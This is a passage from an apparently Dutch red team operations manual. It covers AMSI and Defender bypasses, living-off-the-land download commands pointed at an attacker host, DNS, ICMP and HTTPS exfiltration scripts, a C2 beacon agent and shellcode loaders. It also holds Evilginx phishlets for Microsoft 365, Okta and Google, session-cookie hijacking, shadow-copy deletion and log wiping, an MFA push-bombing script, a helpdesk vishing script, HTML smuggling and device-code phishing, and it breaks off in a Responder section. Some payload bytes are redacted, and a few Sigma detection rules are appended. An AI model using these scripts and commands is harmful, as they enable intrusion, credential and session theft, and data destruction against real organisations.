[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated versie
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like "*Am*ils"}
$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like "*ailed"}
$b.SetValue($null,$true)

# Memory patching (meer reliable)
# REDACTED - Requires custom implementation

# Uitleg: AMSI scant PowerShell, VBScript, JScript.
# Bypass AMSI voordat je malicious code uitvoert.
# Elke bypass wordt uiteindelijk gedetecteerd → roteer.
```

## 12.2 Windows Defender Bypass

```powershell
# Check Defender status
Get-MpComputerStatus

# Disable real-time protection (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Add exclusions
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Disable via registry (stealth)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Uitleg: Defender exclusions zijn krachtig.
# Voeg je payload directory toe als exclusion.
# Registry changes zijn persistent.
```

## 12.3 EDR Evasion Techniques

```powershell
# Unhooking NTDLL (bypass userland hooks)
# REDACTED - Requires custom implementation

# Direct syscalls
# REDACTED - Requires custom implementation

# Process hollowing
# REDACTED - Use tools like ScareCrow

# Module stomping
# REDACTED - Use tools like ModuleStomping

# Uitleg: EDR evasion is een constant kat-en-muis spel.
# Hooking bypass, direct syscalls, en process injection
# zijn de primaire technieken.
# Gebruik gespecialiseerde tools (ScareCrow, NimPackt).
```

## 12.4 Living Off The Land (LOLBins)

```powershell
# Download file via certutil
certutil -urlcache -split -f http://attacker/payload.exe payload.exe

# Download via bitsadmin
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\Windows\Temp\payload.exe

# Execute via mshta
mshta http://attacker/payload.hta

# Execute via rundll32
rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(cmd)")

# Execute via regsvr32
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll

# Uitleg: LOLBins zijn signed Windows binaries.
# Ze omzeilen application whitelisting.
# Minder verdacht dan custom executables.
```

---

# 13. DATA EXFILTRATION

## 13.1 Exfiltration Tools

### Rclone

```bash
# Configure rclone for cloud storage
rclone config
# Kies: MEGA, Google Drive, OneDrive, S3, etc.

# Sync data
rclone copy /path/to/data mega:exfil/victim_name --progress

# Met bandwidth limiting
rclone copy /data mega:exfil --bwlimit 10M

# Uitleg: Rclone is de standaard voor data exfiltratie.
# Ondersteunt 40+ cloud providers.
# Encryption mogelijk.
```

### DNS Exfiltration

```bash
# Encode data in DNS queries
# Data wordt verstuurd als subdomain queries

cat secret.txt | base64 | fold -w 60 | while read line; do
    dig "$line.exfil.attacker.com"
done

# Ontvanger draait DNS server die queries logt

# Uitleg: DNS exfil bypassed veel firewalls.
# DNS is bijna altijd allowed.
# Traag maar stealthy.
```

### HTTPS Exfiltration

```python
#!/usr/bin/env python3
"""
exfil_https.py - HTTPS Exfiltration

Uitleg: Upload data naar attacker server via HTTPS.
Blended in met normaal web traffic.
"""

import requests
import base64
import os

def exfiltrate(filepath, server_url):
    """Upload file to exfil server."""
    
    with open(filepath, 'rb') as f:
        data = base64.b64encode(f.read()).decode()
    
    # Split in chunks
    chunk_size = 1024 * 1024  # 1MB
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        response = requests.post(
            f"{server_url}/upload",
            json={
                "filename": os.path.basename(filepath),
                "chunk": i,
                "total": len(chunks),
                "data": chunk
            },
            verify=False,
            headers={"User-Agent": "Mozilla/5.0"}
        )
    
    return True

# Voorbeeld
# exfiltrate("C:\\Users\\victim\\Documents\\secrets.xlsx", "https://legit-looking-domain.com")
```

## 13.2 Covert Channels

### ICMP Exfiltration

```bash
# Stuur data via ICMP echo requests
# Data in payload van ping packets

# Sender (victim)
cat secret.txt | xxd -p | fold -w 32 | while read hex; do
    ping -c 1 -p "$hex" attacker.com
done

# Receiver (attacker)
tcpdump -n icmp -X | grep -A1 "echo request"

# Uitleg: ICMP is vaak allowed door firewalls.
# Data verstopt in ping payloads.
# Traag maar onzichtbaar voor basic monitoring.
```

---

# 14. COMMAND & CONTROL

## 14.1 Cobalt Strike

```bash
# Listener setup
# Malleable C2 profile voor evasion
# REDACTED - Requires Cobalt Strike license

# Beacon generation
# REDACTED

# Basic commands
beacon> shell whoami
beacon> powershell Get-Process
beacon> upload payload.exe
beacon> download C:\Users\victim\secrets.docx
beacon> spawn x64
beacon> jump psexec target DOMAIN\admin password
```

## 14.2 Sliver C2

```bash
# Start Sliver server
./sliver-server

# Generate implant
sliver > generate --mtls attacker.com --save implant.exe

# Start listener
sliver > mtls -l 443

# Implant interactie
sliver (IMPLANT) > info
sliver (IMPLANT) > ps
sliver (IMPLANT) > netstat
sliver (IMPLANT) > execute-assembly /path/to/SharpHound.exe
sliver (IMPLANT) > pivots
sliver (IMPLANT) > portfwd add -r 192.168.1.10:3389

# Uitleg: Sliver is open-source alternatief voor Cobalt Strike.
# mTLS, WireGuard, HTTP(S), DNS C2 protocols.
# Goede evasion capabilities.
```

## 14.3 Custom C2 Considerations

```python
#!/usr/bin/env python3
"""
simple_c2_agent.py - Minimal C2 Agent Concept

Uitleg: Dit is een minimaal C2 agent voorbeeld.
Productie agents vereisen veel meer features en evasion.
"""

import requests
import subprocess
import time
import base64

class Agent:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.sleep_time = 60
        self.jitter = 0.3
    
    def beacon(self):
        """Check in met C2 server."""
        try:
            response = requests.get(
                f"{self.c2_url}/beacon",
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=30
            )
            return response.json()
        except:
            return None
    
    def execute_command(self, command):
        """Execute command en return output."""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=60
            )
            return base64.b64encode(result.stdout + result.stderr).decode()
        except Exception as e:
            return base64.b64encode(str(e).encode()).decode()
    
    def report(self, task_id, output):
        """Stuur output terug naar C2."""
        try:
            requests.post(
                f"{self.c2_url}/report",
                json={"task_id": task_id, "output": output},
                timeout=30
            )
        except:
            pass
    
    def run(self):
        """Main loop."""
        while True:
            task = self.beacon()
            
            if task and task.get("command"):
                output = self.execute_command(task["command"])
                self.report(task["task_id"], output)
            
            # Sleep met jitter
            jitter = self.sleep_time * self.jitter
            import random
            time.sleep(self.sleep_time + random.uniform(-jitter, jitter))

# PRODUCTIE VEREISTEN (niet geïmplementeerd):
# - Encryption van communicatie
# - Multiple C2 channels (fallback)
# - Process injection
# - Anti-debugging
# - Sandbox detection
# - AMSI bypass
# - ETW bypass
```

---

# 15. MALWARE DEVELOPMENT

## 15.1 Payload Generation

### MSFVenom Payloads

```bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=443 -f exe -o shell.exe

# Windows shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=443 -f raw -o shellcode.bin

# Staged vs stageless
# Staged: Kleiner, download rest van payload
msfvenom -p windows/x64/meterpreter/reverse_tcp ...
# Stageless: Groter, complete payload
msfvenom -p windows/x64/meterpreter_reverse_tcp ...

# Encoders (basic evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=443 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe

# Uitleg: msfvenom genereert basis payloads.
# In praktijk te veel gedetecteerd.
# Gebruik voor development/testing, niet operaties.
```

### Shellcode Loaders

```c
// loader.c - Basic Shellcode Loader
// Uitleg: Laadt en executeert shellcode in memory

#include <windows.h>
#include <stdio.h>

// Shellcode hier (van msfvenom -f c)
unsigned char shellcode[] = 
"\xfc\x48\x83...";  // REDACTED

int main() {
    // Allocate executable memory
    void *exec = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Copy shellcode
    memcpy(exec, shellcode, sizeof(shellcode));
    
    // Execute
    ((void(*)())exec)();
    
    return 0;
}

// EVASION VERBETERINGEN:
// 1. Encrypt shellcode, decrypt at runtime
// 2. Use VirtualProtect instead of RWX allocation
// 3. Syscalls instead of API calls
// 4. Sandbox checks before execution
```

```python
#!/usr/bin/env python3
"""
loader.py - Python Shellcode Loader

Uitleg: Python loader voor Windows shellcode.
Minder detection dan compiled executables.
"""

import ctypes

# Encrypted shellcode (XOR with key)
encrypted_shellcode = b'\x00\x01\x02...'  # REDACTED
xor_key = 0x41

# Decrypt
shellcode = bytes([b ^ xor_key for b in encrypted_shellcode])

# Windows API calls via ctypes
kernel32 = ctypes.windll.kernel32

# Allocate memory
ptr = kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
)

# Copy shellcode
ctypes.memmove(ptr, shellcode, len(shellcode))

# Execute
thread = kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

kernel32.WaitForSingleObject(ctypes.c_int(thread), ctypes.c_int(-1))
```

## 15.2 Evasive Payloads

### ScareCrow

```bash
# Generate evasive loader
./ScareCrow -I shellcode.bin -Loader binary -domain microsoft.com

# Met process injection
./ScareCrow -I shellcode.bin -Loader dll -injection process -process explorer.exe

# Uitleg: ScareCrow genereert EDR-evasive payloads.
# Gebruikt:
# - Direct syscalls
# - Unhooking
# - Code signing spoof
# - ETW bypass
```

### Nimcrypt2

```bash
# Encrypt and pack executable
python3 nimcrypt2.py -f payload.exe -o packed.exe

# Uitleg: Nimcrypt2 packs en encrypt payloads.
# Nim-based loader voor evasion.
# Goed tegen static analysis.
```

---

# 16. DARK WEB INTELLIGENCE

## 16.1 Tor Access

```bash
# Install Tor
apt install tor

# Start Tor service
systemctl start tor

# Configure browser to use SOCKS proxy
# SOCKS5: 127.0.0.1:9050

# Of via torsocks
torsocks curl http://example.onion

# Uitleg: Tor is vereist voor .onion sites.
# SOCKS proxy voor tools en browsers.
```

## 16.2 Intelligence Sources

```markdown
# DARK WEB INTEL SOURCES

## FORUMS & MARKETPLACES
[REDACTED - .onion addresses change frequently]

Typen forums:
- Carding forums (kredietkaart data)
- Credential markets (gelekte logins)  
- Exploit markets (0days, tools)
- RaaS platforms (ransomware affiliates)
- Data leak sites (exfiltrated data)

## CREDENTIAL BREACH SITES
- [REDACTED]
- Monitoren voor client domains
- Alert als nieuwe breaches verschijnen

## PASTE SITES (Clearnet + Tor)
- Pastebin.com (clearnet)
- Ghostbin (Tor)
- 0bin (Tor)
- Monitor voor client data leaks

## RANSOMWARE LEAK SITES
- Elke grote ransomware groep heeft leak site
- Monitor voor clients/partners
- Pre-attack reconnaissance bron

# OPERATIONAL SECURITY
- Gebruik dedicated VM
- Nooit personal info
- VPN → Tor voor extra layer
- Screenshot, niet download
- Assume monitoring by LE
```

## 16.3 Breach Database Queries

```python
#!/usr/bin/env python3
"""
breach_monitor.py - Breach Database Monitor

Uitleg: Monitor breach databases voor client domains.
Alert wanneer nieuwe leaks verschijnen.
"""

import requests
import json
from datetime import datetime

class BreachMonitor:
    def __init__(self, api_keys):
        self.apis = {
            'dehashed': {
                'url': 'https://api.dehashed.com/search',
                'key': api_keys.get('dehashed')
            },
            'intelx': {
                'url': 'https://2.intelx.io/intelligent/search',
                'key': api_keys.get('intelx')
            }
        }
        self.results = []
    
    def search_dehashed(self, domain):
        """Query Dehashed API."""
        # REDACTED: Actual implementation
        pass
    
    def search_intelx(self, domain):
        """Query Intelligence X API."""
        # REDACTED: Actual implementation
        pass
    
    def generate_report(self, domain):
        """Generate breach report voor domain."""
        report = {
            'domain': domain,
            'timestamp': datetime.now().isoformat(),
            'breaches': [],
            'credentials': [],
            'summary': {}
        }
        
        # Query all sources
        # REDACTED
        
        return report

# Voorbeeld usage
if __name__ == "__main__":
    api_keys = {
        'dehashed': 'REDACTED',
        'intelx': 'REDACTED'
    }
    
    monitor = BreachMonitor(api_keys)
    report = monitor.generate_report('target.com')
    print(json.dumps(report, indent=2))
```

---

# 17. EVILGINX PHISHLETS

## 17.1 Evilginx2 Setup

```bash
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Configure
./evilginx2

# Set domain
config domain phish.attacker.com

# Set IP
config ip 1.2.3.4

# Uitleg: Evilginx2 is een man-in-the-middle proxy.
# Captured credentials EN session cookies.
# Bypassed MFA door session te hijacken.
```

## 17.2 Phishlets

### Microsoft O365 Phishlet

```yaml
# o365.yaml - Microsoft 365 Phishlet

name: 'Microsoft 365'
author: 'XPOSE Security'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true}
  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'www.office.com', replace: 'www.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
  - domain: 'login.microsoftonline.com'
    keys: ['SignInStateCookie']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/v2.0/authorize?client_id=*'

# Uitleg: Deze phishlet proxied Microsoft 365 login.
# auth_tokens specificeert welke cookies te capturen.
# Session cookies omzeilen MFA!
```

### Okta Phishlet

```yaml
# okta.yaml - Okta Phishlet

name: 'Okta'
author: 'XPOSE Security'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: '{okta_domain}.okta.com', session: true, is_landing: true}
  - {phish_sub: 'static', orig_sub: 'ok1static', domain: 'oktacdn.com', session: false}

sub_filters:
  - {triggers_on: '{okta_domain}.okta.com', orig_sub: '', domain: '{okta_domain}.okta.com', search: '{okta_domain}.okta.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.{okta_domain}.okta.com'
    keys: ['sid', 'DT']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: '{okta_domain}.okta.com'
  path: '/login/login.htm'

# Uitleg: Okta phishlet vereist target's Okta subdomain.
# Vervang {okta_domain} met target's subdomain.
# Captured session bypass Okta MFA.
```

### Google Workspace Phishlet

```yaml
# google.yaml - Google Workspace Phishlet

name: 'Google Workspace'
author: 'XPOSE Security'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true}

sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'myaccount.google.com', replace: 'myaccount.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'SSID', 'HSID', 'LSID', 'APISID', 'SAPISID']

credentials:
  username:
    key: 'Email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/ServiceLogin'

# Uitleg: Google's login flow is complex.
# Meerdere cookies nodig voor session.
# Test thoroughly - Google updates vaak.
```

## 17.3 Evilginx Operations

```bash
# In evilginx console

# Load phishlet
phishlets hostname o365 login.attacker.com
phishlets enable o365

# Create lure
lures create o365

# Get phishing URL
lures get-url 0

# Monitor sessions
sessions

# View captured session
sessions 1

# Export session cookies (JSON)
sessions 1 export

# Uitleg: Lures zijn de phishing URLs die naar victims gaan.
# Sessions toont captured credentials en cookies.
# Export cookies naar JSON voor import in browser.
```

```bash
# Import captured session in browser

# Firefox: Cookie Editor extension
# Chrome: EditThisCookie extension

# Of via script:
# 1. Open browser DevTools
# 2. Console > paste cookies
document.cookie = "SID=value; domain=.google.com; path=/";
document.cookie = "HSID=value; domain=.google.com; path=/";
# etc.

# Uitleg: Na cookie import, refresh de pagina.
# Je bent nu ingelogd als victim.
# MFA is al gecompleted door victim.
```

---

# 18. COMPLETE ATTACK CHAINS

## 18.1 Initial Access to Domain Admin

```markdown
# ATTACK CHAIN: INITIAL ACCESS → DOMAIN ADMIN

## FASE 1: RECONNAISSANCE (Week 1-2)

### Day 1-3: Passive OSINT
□ Subdomain enumeration (subfinder, amass)
□ Employee discovery (LinkedIn, Hunter.io)
□ Technology fingerprinting (Wappalyzer, Shodan)
□ Credential leak search (Dehashed, IntelX)
□ Document metadata extraction

### Day 4-7: Active Reconnaissance  
□ Port scanning (nmap full TCP)
□ Service enumeration
□ Web application scanning (nuclei)
□ DNS enumeration
□ Cloud asset discovery

### Day 8-14: Target Profiling
□ Priority target list (IT, Security, Executives)
□ Attack surface mapping
□ Initial access vector selection
□ Phishing pretext development

## FASE 2: INITIAL ACCESS (Week 3-4)

### Primary Vector: Credential Attack
□ Credential stuffing met breach data
□ Password spraying (O365/VPN)
□ MFA bypass attempt (fatigue, token theft)

### Fallback: Phishing
□ Deploy phishing infrastructure (GoPhish, Evilginx)
□ Send targeted phishing (IT/Helpdesk focus)
□ Capture credentials/sessions
□ Establish foothold

### Success Criteria
□ Valid credentials obtained
□ VPN/remote access achieved
□ Initial implant deployed
□ C2 communication established

## FASE 3: POST-EXPLOITATION (Week 5-8)

### Situational Awareness
□ Run automated enum (WinPEAS, BloodHound)
□ Identify current user privileges
□ Map network topology
□ Identify security controls

### Credential Harvesting
□ LSASS dump (comsvcs.dll method)
□ Browser credential extraction
□ Registry autologon check
□ Kerberoasting
□ AS-REP roasting

### Establish Persistence
□ Layer 1: Scheduled task + Registry
□ Layer 2: WMI subscription
□ Layer 3: Dormant access (creds, tickets)

## FASE 4: LATERAL MOVEMENT (Week 9-12)

### Privilege Escalation
□ Local admin via credential reuse
□ Server access via harvested creds
□ Token impersonation waar mogelijk

### Domain Compromise Path
□ Analyze BloodHound data
□ Identify shortest path to DA
□ Execute path:
   - Kerberoast service accounts
   - Exploit delegation
   - ADCS abuse
   - DCSync

### Success Criteria
□ Domain Admin achieved
□ Multiple persistence mechanisms
□ All domain hashes obtained

## FASE 5: OBJECTIVE COMPLETION (Week 13-16)

### Crown Jewels Access
□ Identify high-value data
□ Access file servers
□ Access databases
□ Access email/SharePoint

### Ransomware Simulation
□ Test backup accessibility
□ Verify ESXi access
□ Document impact potential
□ NO actual encryption

### Documentation
□ Complete attack narrative
□ All credentials (encrypted)
□ Detection gaps
□ Recommendations

## DELIVERABLES

1. Executive Summary (2-5 pages)
2. Technical Report (50-200 pages)
3. Attack Path Diagrams
4. Detection Gap Analysis
5. Remediation Roadmap
6. Raw Data Package (encrypted)
```

## 18.2 Ransomware Simulation Chain

```markdown
# ATTACK CHAIN: RANSOMWARE SIMULATION

## PRE-CONDITIONS
□ Domain Admin achieved
□ Network mapped
□ Backup systems identified
□ ESXi hosts identified

## PHASE 1: PRE-ENCRYPTION SETUP

### Disable Security
□ GPO for Defender disable
□ Tamper protection bypass
□ EDR agent stop/uninstall

### Disable Recovery
□ Delete Volume Shadow Copies
□ Disable Windows Recovery
□ Clear Windows event logs

### Commands:
```powershell
# Shadow copies
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Recovery
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures

# Event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

## PHASE 2: BACKUP COMPROMISE ASSESSMENT

### Backup Server Access
□ Identify backup solution (Veeam, Commvault, etc.)
□ Access backup console
□ Verify we CAN delete backups (don't actually delete)
□ Document backup architecture

### Air-Gap Assessment
□ Check for offline backups
□ Test network isolation
□ Identify immutable storage

### Document
□ "Backup compromise possible: YES/NO"
□ Recovery capability: HIGH/MEDIUM/LOW

## PHASE 3: DEPLOYMENT SIMULATION

### GPO Deployment Test
□ Create test GPO
□ Link to test OU
□ Verify execution capability
□ Remove test GPO

### Coverage Assessment
```powershell
# Count reachable systems
$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
$reachable = 0
foreach ($comp in $computers) {
    if (Test-Connection -ComputerName $comp -Count 1 -Quiet) {
        $reachable++
    }
}
Write-Output "Reachable: $reachable / $($computers.Count)"
```

### ESXi Access
□ SSH to ESXi hosts
□ Verify we can stop VMs (don't actually stop)
□ Document VM inventory

## PHASE 4: IMPACT ASSESSMENT

### Calculate Blast Radius
□ % of systems reachable
□ % of data accessible
□ Backup compromise status
□ ESXi coverage

### Business Impact Model
□ Estimated downtime
□ Estimated financial impact
□ Recovery complexity
□ Recommendation: Would client need to pay?

## PHASE 5: EVIDENCE CLEANUP

□ Remove all implants
□ Remove persistence mechanisms
□ Delete tools and artifacts
□ Document cleanup actions

## REPORT SECTIONS
1. Attack narrative
2. Systems reached (%)
3. Backup assessment
4. ESXi assessment
5. Impact calculation
6. Recommendations
```

---

# APPENDIX A: TOOL QUICK REFERENCE

```markdown
## RECONNAISSANCE
- subfinder, amass, assetfinder    # Subdomain enum
- httpx, nuclei, nmap              # Service scanning
- theHarvester, hunter.io          # Email discovery
- linkedin2username, crosslinked   # Employee enum
- Shodan, Censys                   # Internet scanning

## INITIAL ACCESS
- GoPhish, Evilginx2              # Phishing
- MSOLSpray, Sprayhound           # Password spraying
- Hydra, Medusa                   # Brute force

## EXPLOITATION
- Metasploit, SQLMap              # General exploitation
- Impacket                        # AD attacks
- CrackMapExec                    # SMB/AD swiss army knife
- BloodHound, SharpHound          # AD enumeration
- Certipy                         # ADCS attacks
- Rubeus                          # Kerberos attacks

## POST-EXPLOITATION
- Mimikatz, pypykatz              # Credential dumping
- WinPEAS, LinPEAS                # Privilege escalation
- PowerUp, Seatbelt               # Windows enum
- Cobalt Strike, Sliver, Havoc    # C2 frameworks

## EVASION
- ScareCrow, NimPackt             # Payload generation
- Invoke-Obfuscation              # PowerShell obfuscation

## EXFILTRATION
- Rclone                          # Cloud exfil
- DNScat2                         # DNS tunneling

## CRACKING
- Hashcat, John the Ripper        # Password cracking
```

---

# APPENDIX B: DETECTION SIGNATURES

```yaml
# Sigma rule examples voor Blue Team

title: Mimikatz Execution
status: stable
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        - CommandLine|contains:
            - 'sekurlsa'
            - 'kerberos::list'
            - 'lsadump'
        - Image|endswith:
            - '\mimikatz.exe'
    condition: selection

---

title: DCSync Attack
status: stable
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains: 
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # Replicating Directory Changes
            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # Replicating Directory Changes All
    filter:
        SubjectUserName|endswith: '$'  # Exclude computer accounts
    condition: selection and not filter

---

title: Shadow Copy Deletion
status: stable
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        CommandLine|contains:
            - 'vssadmin delete shadows'
            - 'wmic shadowcopy delete'
    condition: selection
level: critical
```

---

**EINDE XPOSE RED TEAM OPERATIONS MANUAL**

---

*Dit document is vertrouwelijk en uitsluitend bedoeld voor geautoriseerde XPOSE Security operators.*

*Alle technieken mogen alleen worden gebruikt met expliciete schriftelijke toestemming van de target organisatie.*

*[REDACTED] secties bevatten informatie die te gevoelig is voor documentatie en worden behandeld in hands-on training.*

---

# ADDENDUM: APT-SPECIFIEKE TECHNIEKEN

## A.1 Scattered Spider Technieken

### MFA Fatigue Attack
```python
#!/usr/bin/env python3
"""
mfa_fatigue.py - MFA Push Bombing
Techniek: Scattered Spider / Lapsus$
"""

import requests
import time
import random
from datetime import datetime

def trigger_o365_mfa(email: str, password: str) -> bool:
    """Trigger MFA push voor O365."""
    url = "https://login.microsoftonline.com/common/oauth2/token"
    data = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "resource": "https://graph.microsoft.com"
    }
    
    r = requests.post(url, data=data, timeout=30)
    
    if r.status_code == 200:
        print(f"[+] SUCCESS! MFA approved at {datetime.now()}")
        return True
    
    if "AADSTS50074" in r.text or "AADSTS50076" in r.text:
        print(f"[*] MFA push sent at {datetime.now()}")
    
    return False

def fatigue_attack(email: str, password: str, max_attempts: int = 30):
    """
    Execute MFA fatigue attack.
    
    Optimal timing:
    - 02:00-04:00: User is tired
    - 07:00-08:00: Morning rush
    - 17:00-18:00: End of workday
    """
    for attempt in range(max_attempts):
        print(f"[*] Attempt {attempt + 1}/{max_attempts}")
        
        if trigger_o365_mfa(email, password):
            return True
        
        # Random interval 2-5 minutes
        sleep_time = random.uniform(120, 300)
        time.sleep(sleep_time)
    
    return False

# Uitleg: MFA fatigue werkt omdat:
# 1. Users zijn geconditioneerd om MFA goed te keuren
# 2. Om 3 AM denken mensen niet helder
# 3. Na 10+ pushes keuren ze goed om het te stoppen
# 4. Combineer met vishing: "IT Security, we zien verdachte pushes..."
```

### Vishing Script (Helpdesk Impersonation)
```markdown
# SCATTERED SPIDER VISHING SCRIPT

## Pretext: Locked Account

"Hi, this is [Target Name] from [Department].

I've been locked out of my account for about an hour now. 
I have a critical deadline at [time] and my manager [Manager Name] 
is waiting on this deliverable.

My employee ID is [ID]. Can you help me reset my password 
or set up a temporary MFA bypass?

I'm calling from my personal phone because I can't access 
anything on my work devices."

## Verification Responses:
- Birthday: [from OSINT]
- Manager: [from LinkedIn org chart]
- Start date: [from LinkedIn]
- SSN last 4: "I don't have that memorized, can [Manager] verify?"

## Goal:
1. Password reset → immediate access
2. MFA device enrollment → persistent access
3. Session token → bypass MFA entirely
```

## A.2 APT29 Technieken

### HTML Smuggling (EnvyScout)
```html
<!DOCTYPE html>
<html>
<head><title>Secure Document</title></head>
<body>
<div style="text-align: center; padding: 50px; font-family: Arial;">
    <h2>Loading secure document...</h2>
    <p id="status">Please wait...</p>
</div>

<script>
// Base64 encoded ISO payload
var payload = "UEsDBAoAAAAAAI..."; // REDACTED

function b64toBlob(b64, type) {
    var byteChars = atob(b64);
    var byteArrays = [];
    for (var i = 0; i < byteChars.length; i += 512) {
        var slice = byteChars.slice(i, i + 512);
        var byteNumbers = new Array(slice.length);
        for (var j = 0; j < slice.length; j++) {
            byteNumbers[j] = slice.charCodeAt(j);
        }
        byteArrays.push(new Uint8Array(byteNumbers));
    }
    return new Blob(byteArrays, {type: type});
}

function downloadPayload() {
    var blob = b64toBlob(payload, 'application/octet-stream');
    var url = window.URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'Document.iso';
    document.body.appendChild(a);
    a.click();
    document.getElementById('status').innerHTML = 
        '<span style="color:green">✓ Download complete</span>';
}

setTimeout(downloadPayload, 2000);
</script>
</body>
</html>

<!-- Uitleg: APT29 EnvyScout technique:
     1. HTML bevat base64-encoded payload
     2. JavaScript decoded en triggert download
     3. ISO bypasses Mark-of-the-Web (MOTW)
     4. SmartScreen wordt niet getriggerd
     5. LNK inside ISO executeert payload -->
```

### Device Code Phishing
```python
#!/usr/bin/env python3
"""
device_code_phish.py - OAuth Device Code Phishing
Techniek: APT29
"""

import requests
import time

CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

def get_device_code():
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
    data = {
        "client_id": CLIENT_ID,
        "scope": "openid profile offline_access Mail.Read Files.ReadWrite.All"
    }
    return requests.post(url, data=data).json()

def poll_for_token(device_code: str, timeout: int = 900):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": device_code
    }
    
    start = time.time()
    while time.time() - start < timeout:
        r = requests.post(url, data=data)
        if "access_token" in r.json():
            return r.json()
        time.sleep(5)
    return None

# Workflow:
# 1. Get device code
# 2. Send to victim: "Go to microsoft.com/devicelogin, enter code: XXXXXX"
# 3. Victim authenticates normally (with MFA)
# 4. We receive access_token + refresh_token
# 5. Refresh token = persistent access without MFA
```

## A.3 APT28 Technieken

### Responder - LLMNR/NBT-NS Poisoning
```bash
# Start Responder voor credential harvesting
sudo responder -I eth0 -wrf

# Uitleg:
# -w = WPAD proxy
# -r = Respond to NetBIOS
# -f = Force WPAD authentication

# Wat gebeurt er:
# 1. User typt verkeerde hostname (bijv. \\fileserverr)
# 2. DNS lookup faalt
# 3. LLMNR/NBT-NS broadcast
# 4. Responder antwoordt "dat ben ik!"
